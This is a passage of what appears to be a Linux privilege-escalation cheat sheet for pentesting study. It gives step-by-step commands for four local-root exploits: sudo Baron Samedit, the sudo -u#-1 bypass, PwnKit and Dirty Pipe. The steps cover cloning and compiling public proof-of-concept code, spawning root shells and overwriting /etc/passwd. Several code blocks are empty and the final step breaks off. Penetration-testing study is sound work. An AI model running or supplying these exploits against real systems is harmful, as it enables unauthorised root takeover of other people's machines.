Affects many old sudo versions (e.g. 1.8.31 on Ubuntu 20.04, 1.8.27 Debian 10, 1.9.2 Fedora 33). Any local user → root.
| Step | Command |
|---|---|
| Check sudo ver | `sudo -V | head -n1` |
| Check OS | `cat /etc/lsb-release` |
| Get PoC | `git clone https://github.com/blasty/CVE-2021-3156.git` |
| Build | `cd CVE-2021-3156 && make` |
| See targets | `./sudo-hax-me-a-sandwich` |
| Pick target | `./sudo-hax-me-a-sandwich 1` |
| Confirm | `id` |
> Target number is **not universal** — match it to the exact OS/sudo/libc.

## Attack 2 — CVE-2019-14287 (sudo `-u#-1` bypass, sudo < 1.8.28)

**When:** `sudo -l` shows `(ALL, !root) /bin/<cmd>` — you can run it as any user *except* root. The bug: `-u#-1` is treated as UID 0 (root), because the block only checks the word "root", not the number.
| Step | Command |
|---|---|
| Check ver | `sudo -V | head -n1` (must be < 1.8.28) |
| Check rights | `sudo -l` |
| Exploit | `sudo -u#-1 <allowed-command>` |
Example with `ncdu` (GTFOBins says press `b` for a shell):
```bash
sudo -u#-1 /bin/ncdu
```
Then press `b` → root shell → `id`.

# Section 24 — Polkit / PwnKit (CVE-2021-4034)

**polkit** decides if a program may do something; its tool **`pkexec`** runs commands as root (like sudo). **PwnKit** is a memory bug in `pkexec`, present 10+ years, affecting nearly every unpatched Linux. **No sudo rule needed** — any local user → root.

### Do I have this? → check the pkexec/polkit version
```bash
pkexec --version; dpkg -l policykit-1 2>/dev/null
```
Anything **before the Jan 2022 patch** = almost certainly vulnerable (it affected nearly every Linux). You also need `gcc` to compile the PoC. Patched version, or no compiler → skip.
| # | Command | What |
|---|---|---|
| 1 | `pkexec --version` or `dpkg -l policykit-1` | pre-Jan-2022 = likely vulnerable |
| 2 | `git clone https://github.com/arthepsy/CVE-2021-4034.git` | PoC |
| 3 | `cd CVE-2021-4034 && gcc cve-2021-4034-poc.c -o poc` | compile |
| 4 | `./poc` | run → root |
| 5 | `id` | confirm (type `bash` if dropped in `sh`) |

# Section 25 — Dirty Pipe (CVE-2022-0847)

- **Kernel** bug: write to files you can only **read** — including root-owned files.
- Affects kernels **5.8 → 5.17**. No sudo rule needed.
- Classic uses: blank root's password in `/etc/passwd`, or hijack a SUID binary.

### Do I have this? → check the kernel version
```bash
uname -r
```
Version in the **5.8 – 5.17** range → candidate (e.g. `5.13.0-46-generic`). You also need `gcc` to run `compile.sh`. Outside that range, or no compiler → skip.

```bash
uname -r
```
(5.8–5.17 = candidate)
```bash

```
```bash
cd CVE-2022-0847-DirtyPipe-Exploits && bash compile.sh
```
**Option A — `exploit-1` (easiest, overwrites /etc/passwd):**
```bash

```
→ sets root password to "piped" and pops a root shell.
**Option B — `exploit-2` (hijack a SUID binary):**
